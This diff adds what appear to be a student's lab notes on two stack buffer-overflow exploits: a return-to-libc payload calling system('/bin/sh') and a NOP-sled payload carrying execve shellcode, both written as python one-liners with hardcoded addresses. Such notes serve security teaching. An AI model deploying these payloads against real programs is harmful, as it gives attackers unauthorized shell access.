@@ -1,0 +1,22 @@
+return-to-libc exploit: 
+using a buffer overflow to overwrite in the stack frame: ebp, eip & func arguments
+ to create a "fake" stack frame to call : system(/bin/sh) -> to open a shell.
+
+all instruction in the pdf:
+
+system: 0xf7e4c850
+SHELL env var: 0xffffdf73 -> 0xffffdf73 + 6 = 0xffffdf79
+exit: 0xf7e40800
+
+		front pad	       	  system adr	dumm exit adr	shell adr	
+buffer content: (python -c 'print "A"*132 + "\x50\xc8\xe4\xf7" + "DUMM" + "\x79\xdf\xff\xff"')
+--------------------------------------------------------------------------------------------------------------------------------------
+1. putting a shellcode inside the buffer
+2. using a buffer overflow to overwrite the return address so it will jump to the buffer's address (and exec a shell)
+3. padding the beginning of the buffer with nops to create "a landing area" for our jump adress (because we cant get the exact address using gdb)
+
+
+		padding 					shellcode							add of the middle of the nops
+*$(python -c 'print "\x90"*107 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80" + "\x40\xd8\xff\xff"')
+
+
